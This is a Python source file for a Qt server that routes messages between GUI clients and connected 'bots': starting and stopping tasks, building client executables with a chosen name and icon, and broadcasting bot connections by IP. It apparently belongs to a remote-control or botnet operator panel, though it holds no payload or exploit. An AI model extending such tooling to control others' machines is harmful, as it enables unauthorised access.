from qtpy.QtCore import Signal

from QtPyNetwork.server import QThreadedServer

from qasync import asyncSlot

from models import Task, Info


class GUIServer(QThreadedServer):
    """GUI server."""
    stop_task = Signal(int, int)
    start_task = Signal(int, str, dict, int)
    get_tasks = Signal(int)

    build_start = Signal(int, str, str, list)
    build_stop = Signal(int)
    build_options = Signal(int)

    def __init__(self):
        super(GUIServer, self).__init__()

    @asyncSlot(int, dict)
    async def on_message(self, device_id: int, message: dict):
        event_type = message.get("event_type")
        if event_type == "task":
            event = message.get("event")
            if event == "options":
                self.get_tasks.emit(device_id)

            elif event == "stop":
                self.stop_task.emit(message.get("bot_id"), message.get("task_id"))

            elif event == "start":
                self.start_task.emit(message.get("bot_id"), message.get("task"),
                                     message.get("kwargs"), message.get("user_activity"))
        elif event_type == "build":
            event = message.get("event")
            if event == "start":
                self.build_start.emit(device_id, message.get("name"), message.get("icon"), message.get("generators"))
            elif event == "options":
                self.build_options.emit(device_id)
            elif event == "stop":
                self.build_stop.emit(device_id)

    @asyncSlot(int, list)
    async def on_get_tasks(self, client_id, tasks):
        self.write(client_id, {"event_type": "task",
                               "event": "options",
                               "options": {"tasks": tasks}})

    @asyncSlot(int, str, str)
    async def on_generator_progress(self, client_id, generator_name, progress):
        self.write(client_id, {"event_type": "build",
                               "event": "progress",
                               "generator_name": generator_name,
                               "progress": progress})

    @asyncSlot(int, str)
    async def on_generator_started(self, client_id, generator_name):
        self.write(client_id, {"event_type": "build",
                               "event": "started",
                               "generator_name": generator_name})

    @asyncSlot(int, str, int)
    async def on_generator_finished(self, client_id, generator_name, exit_code):
        self.write(client_id, {"event_type": "build",
                               "event": "generator_finished",
                               "generator_name": generator_name,
                               "exit_code": exit_code})

    @asyncSlot(int, dict)
    async def on_build_options(self, client_id, options):
        self.write(client_id, {"event_type": "build",
                               "event": "options",
                               "options": options})

    @asyncSlot(int)
    async def on_build_finished(self, client_id):
        self.write(client_id, {"event_type": "build",
                               "event": "build_finished"})

    @asyncSlot(int)
    async def on_build_stopped(self, client_id):
        self.write(client_id, {"event_type": "build",
                               "event": "stopped"})

    @asyncSlot(int, str)
    async def on_build_error(self, client_id, error):
        self.write(client_id, {"event_type": "build",
                               "event": "error",
                               "error": error})

    @asyncSlot(int, str, int)
    async def on_bot_connected(self, bot_id, ip, port):
        self.writeAll({"event_type": "connection",
                       "event": "connected",
                       "bot_id": bot_id,
                       "ip": ip,
                       "port": port})

    @asyncSlot(int)
    async def on_bot_disconnected(self, bot_id):
        self.writeAll({"event_type": "connection",
                       "event": "disconnected",
                       "bot_id": bot_id})

    @asyncSlot(Task)
    async def on_bot_task(self, task):
        self.writeAll(task.serialize())

    @asyncSlot(Info)
    async def on_bot_info(self, info):
        self.writeAll(info.serialize())
